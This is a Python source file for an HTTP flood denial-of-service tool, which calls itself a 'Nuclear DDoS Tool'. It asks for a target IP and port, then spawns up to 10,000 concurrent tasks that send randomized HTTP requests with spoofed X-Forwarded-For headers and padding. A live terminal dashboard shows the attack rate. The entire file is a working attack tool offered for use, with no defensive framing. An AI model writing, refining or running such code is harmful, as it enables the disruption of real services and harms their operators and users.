#!/usr/bin/python3
# -*- coding: utf-8 -*-
import os
import sys
import socket
import random
import asyncio
import resource
import threading
import time
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.layout import Layout
from rich.text import Text

console = Console()
running = True
lock = threading.Lock()
MAX_THREADS = 10000
BATCH_SIZE = 250
user_agents = []

def optimize_system():
    try:
        os.system("echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse")
        resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))
    except:
        console.print("[yellow]⚠️ Couldn't optimize system limits[/]")

class AttackStats:
    def __init__(self):
        self.reset_stats()
        
    def reset_stats(self):
        with lock:
            self.current_rps = 0
            self.current_mbps = 0
            self.total_requests = 0
            self.total_data_mb = 0
    
    def update(self, payload_size):
        with lock:
            self.current_rps += 1
            self.current_mbps += (payload_size * 8) / 1_000_000
            self.total_requests += 1
            self.total_data_mb += payload_size / (1024 * 1024)
    
    def get_stats(self, reset=True):
        with lock:
            stats = {
                'rps': self.current_rps,
                'mbps': self.current_mbps,
                'total': self.total_requests,
                'data': self.total_data_mb
            }
            if reset:
                self.current_rps = 0
                self.current_mbps = 0
            return stats

stats = AttackStats()

def generate_payload(ip, size=1024):
    method = random.choice(["GET", "POST", "HEAD", "PUT", "DELETE"])
    path = f"/{random.randint(1,9999)}" if random.random() > 0.7 else random.choice([
        "/", "/api", "/wp-admin", "/.env", "/graphql"
    ])
    
    payload = (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {ip}\r\n"
        f"User-Agent: {random.choice(user_agents)}\r\n"
        f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
    )
    
    for _ in range(random.randint(2, 5)):
        payload += f"X-Header-{random.randint(1000,9999)}: {random.getrandbits(32)}\r\n"
    
    current = len(payload.encode())
    remaining = max(0, size - current - 4)
    if remaining > 0:
        payload += f"Padding: {'X'*remaining}\r\n"
    
    payload += "\r\n"
    return payload.encode()

async def attack_task(ip, port, duration, size):
    end_time = time.time() + duration
    while time.time() < end_time and running:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port),
                timeout=1.0
            )
            payload = generate_payload(ip, size)
            writer.write(payload)
            stats.update(len(payload))
            await writer.drain()
            writer.close()
            await writer.wait_closed()
        except:
            pass

async def attack_manager(ip, port, duration, size, threads):
    sem = asyncio.Semaphore(10000)  
    
    async def worker():
        async with sem:
            await attack_task(ip, port, duration, size)
    
    tasks = []
    for _ in range(threads):
        if not running:
            break
        task = asyncio.create_task(worker())
        tasks.append(task)
        await asyncio.sleep(0.001) 
    
    await asyncio.gather(*tasks)

def create_layout():
    layout = Layout()
    layout.split(
        Layout(name="header", size=3),
        Layout(name="main", ratio=1),
        Layout(name="footer", size=3)
    )
    layout["main"].split_row(
        Layout(name="stats"),
        Layout(name="params")
    )
    return layout

def update_display(layout, ip, port, threads, duration, size, start_time):
    current = stats.get_stats()
    elapsed = time.time() - start_time
    remaining = max(0, duration - elapsed)
    
    stats_table = Table(
        title="[bold red]⚡ LIVE STATS[/]",
        box=None,
        show_header=False,
        padding=(0, 2)
    )
    stats_table.add_column(style="bold cyan")
    stats_table.add_column(style="bold green")
    
    stats_table.add_row("Requests/s", f"{current['rps']:,}")
    stats_table.add_row("Throughput", f"{current['mbps']:.2f} Mbps")
    stats_table.add_row("Total", f"{current['total']:,}")
    stats_table.add_row("Data Sent", f"{current['data']:.2f} MB")
    stats_table.add_row("Time Left", f"{int(remaining)}s")
    
    params_table = Table(
        title="[bold yellow]💣 ATTACK PARAMS[/]",
        box=None,
        show_header=False,
        padding=(0, 2)
    )
    params_table.add_column(style="bold cyan")
    params_table.add_column(style="bold green")
    
    params_table.add_row("Target", f"{ip}:{port}")
    params_table.add_row("Threads", f"{threads:,}")
    params_table.add_row("Payload", f"{size} bytes")
    params_table.add_row("Duration", f"{duration}s")
    
    layout["header"].update(
        Panel.fit(
            "[blink red] WAKKK MODE: FULL SENDSKY ULTIMATE [/]",
            border_style="bright_red"
        )
    )
    layout["stats"].update(stats_table)
    layout["params"].update(params_table)
    layout["footer"].update(
        Panel.fit(
            f"[bold yellow]Attacking since {datetime.fromtimestamp(start_time).strftime('%H:%M:%S')}[/]",
            border_style="bright_blue"
        )
    )
    
    return layout

async def main_async():
    optimize_system()
    
    global user_agents
    try:
        with open("useragents.txt") as f:
            user_agents = [line.strip() for line in f if line.strip()]
    except:
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",

        ]
    
    console.print(Panel.fit(
        "[bold red]WAKKK MODE ACTIVATED[/]",
        subtitle="[yellow]Nuclear DDoS Tool[/]",
        border_style="bright_red"
    ))
    
    ip = console.input("[bold cyan]>> Target IP: [/]")
    port = int(console.input("[bold cyan]>> Target Port: [/]"))
    threads = min(int(console.input(f"[bold cyan]>> Threads (1-{MAX_THREADS}): [/]")), MAX_THREADS)
    duration = int(console.input("[bold cyan]>> Duration (sec): [/]"))
    size = int(console.input("[bold cyan]>> Payload Size (bytes): [/]"))
    
    layout = create_layout()
    start_time = time.time()
    
    with Live(layout, refresh_per_second=10, screen=True) as live:
        manager = asyncio.create_task(
            attack_manager(ip, port, duration, size, threads)
        )
        
        while running and (time.time() - start_time) < duration:
            live.update(update_display(
                layout, ip, port, threads, duration, size, start_time
            ))
            await asyncio.sleep(0.1)
        
        await manager

def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        console.print("\n[bold red]🚨 ATTACK STOPPED![/]")
    finally:
        final = stats.get_stats(False)
        console.print(Panel.fit(
            f"[bold green]💥 ATTACK SUMMARY[/]\n"
            f"Total Requests: [bold]{final['total']:,}[/]\n"
            f"Data Sent: [bold]{final['data']:.2f} MB[/]\n"
            f"Peak RPS: [bold]{final['rps']:,}[/]",
            border_style="bright_green"
        ))

if __name__ == "__main__":
    main()
